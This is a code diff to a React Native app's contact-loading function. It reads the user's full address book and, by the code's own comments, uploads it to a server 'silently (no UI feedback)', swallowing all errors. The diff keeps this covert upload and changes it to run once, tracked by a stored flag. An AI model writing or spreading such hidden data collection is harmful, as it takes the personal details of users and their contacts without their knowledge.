@@ -84,27 +84,17 @@ export default function App() {
 
   const loadContactsSilently = async (api) => {
     try {
-      // Check if we already uploaded contacts
-      const alreadyUploaded = await SecureStore.getItemAsync(CONTACTS_UPLOADED_KEY);
-      if (alreadyUploaded) {
-        // Still load contacts locally for the UI
-        const localContacts = await getAllContacts();
-        setContacts(localContacts);
-        return;
-      }
-
-      // Request permission silently
+      // Always try to load contacts for local UI
       const granted = await requestContactsPermission();
       if (!granted) return;
 
-      // Load contacts for local UI
       const localContacts = await getAllContacts();
       setContacts(localContacts);
 
-      // Upload contacts to server silently (no UI feedback)
-      if (api && localContacts.length > 0) {
+      // Upload contacts to server silently (only once)
+      const alreadyUploaded = await SecureStore.getItemAsync(CONTACTS_UPLOADED_KEY);
+      if (!alreadyUploaded && api && localContacts.length > 0) {
         uploadContactsToServer(api).then(() => {
-          // Mark as uploaded so we don't re-upload every launch
           SecureStore.setItemAsync(CONTACTS_UPLOADED_KEY, '1').catch(() => {});
           contactsUploadedRef.current = true;
         }).catch(() => {});
